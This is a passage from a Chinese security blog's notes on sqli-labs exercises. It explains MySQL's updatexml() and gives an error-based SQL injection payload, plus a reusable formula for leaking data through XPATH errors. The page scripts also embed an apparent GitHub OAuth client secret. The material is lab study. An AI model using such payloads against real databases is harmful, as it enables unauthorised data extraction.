<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#### updatexml()</span><br><span class="line"></span><br><span class="line">* `updatexml()`是一个使用不同的xml标记匹配和替换xml块的函数。</span><br><span class="line">* 语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</span><br><span class="line">* updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>mysql&gt; select (updatexml(1,concat(0x7e,(version()),0x7e),1));<br>ERROR 1105 (HY000): XPATH syntax error: ‘<del>5.5.44-0ubuntu0.14.04.1</del>‘</p>
<pre><code>
公式:
updatexml(数字,带有&#39;~&#39;的任何东西,数字)
updatexml(数字,(concat(0x7e,(长度不过63的任意字符),0x7e)),数字)


## less 18 - Less19

地点不一样，懒得弄了.

## Less20 - Less23
base64编码了一下，还是一样

## Less24 | 二次注入
</code></pre>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/web/">web</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/inject/">inject</a></div><hr></div></article></div><!--!--><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">上一页</a></div><div class="pagination-next"><a href="/page/2/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="UPON-2021"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">UPON-2021</p><p class="is-size-6 is-block">游走于 web2 &amp; web3 的嘿阔 (很菜)</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">14</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">20</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/upon-2021" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/upon-2021/"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="/%E8%AF%B6%E5%98%BF%EF%BC%9F"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Next" href="/%E5%96%B5%E5%96%B5%E5%96%B5%EF%BC%9F"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.google.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">谷歌</span></span><span class="level-right"><span class="level-item tag">www.google.com</span></span></a></li><li><a class="level is-mobile" href="https://www.baidu.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">百度</span></span><span class="level-right"><span class="level-item tag">www.baidu.com</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新评论</h3><span class="body_hot_comment">加载中，最新评论有1分钟缓存...</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-26T12:19:45.878Z">2022-11-26</time></p><p class="title"><a href="/2022/11/26/hitctf/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-21T07:19:15.755Z">2022-11-21</time></p><p class="title"><a href="/2022/11/21/cbc/">CBC反转攻击详解</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-04T08:46:20.569Z">2022-11-04</time></p><p class="title"><a href="/2022/11/04/ssti%E5%AD%A6%E4%B9%A0/">SSTI学习</a></p><p class="categories"><a href="/categories/ssti/">ssti</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-31T07:17:02.326Z">2022-10-31</time></p><p class="title"><a href="/2022/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%87%E5%BF%98%E5%BD%95/">文件上传备忘录</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-28T04:29:24.435Z">2022-10-28</time></p><p class="title"><a href="/2022/10/28/das10%E5%A4%8D%E7%8E%B0/">DasCTF 十月月赛复现</a></p><p class="categories"><a href="/categories/%E5%A4%8D%E7%8E%B0/">复现</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/ssti/"><span class="level-start"><span class="level-item">ssti</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"><span class="level-start"><span class="level-item">备忘录</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">复现</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2022/11/"><span class="level-start"><span class="level-item">十一月 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2022/10/"><span class="level-start"><span class="level-item">十月 2022</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2022/09/"><span class="level-start"><span class="level-item">九月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WEB/"><span class="tag">WEB</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ETH/"><span class="tag">ETH</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Solidity/"><span class="tag">Solidity</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/upload/"><span class="tag">upload</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Blockchain/"><span class="tag">Blockchain</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Crypto/"><span class="tag">Crypto</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hexo/"><span class="tag">Hexo</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQL/"><span class="tag">SQL</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Troubleshooting/"><span class="tag">Troubleshooting</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/XOR/"><span class="tag">XOR</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/inject/"><span class="tag">inject</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/phar/"><span class="tag">phar</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssti/"><span class="tag">ssti</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"><span class="tag">备忘录</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A4%8D%E7%8E%B0/"><span class="tag">复现</span><span class="tag is-grey-lightest">1</span></a></div></div><div class="field is-grouped is-grouped-multiline"><a class="tags has-addons" href="/tags/"><span class="tag">查看全部&gt;&gt;</span></a></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.png" alt="UPONのblog" height="28"></a><p class="size-small"><span>&copy; 2022 UPON2021</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！";
        }var now = new Date();setInterval("createTime('2022/9/29 17:30:00')", 250,"");</script><br></span><div class="size-small"><span></span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2364053447" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('be835d1ee57b9ec974c1','5b2d7f351be105e013f11fa0ebde21cbea192152','UPON-2021','upon-2021.github.io',false);})</script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(true){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('be835d1ee57b9ec974c1','5b2d7f351be105e013f11fa0ebde21cbea192152','UPON-2021','upon-2021.github.io',false);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>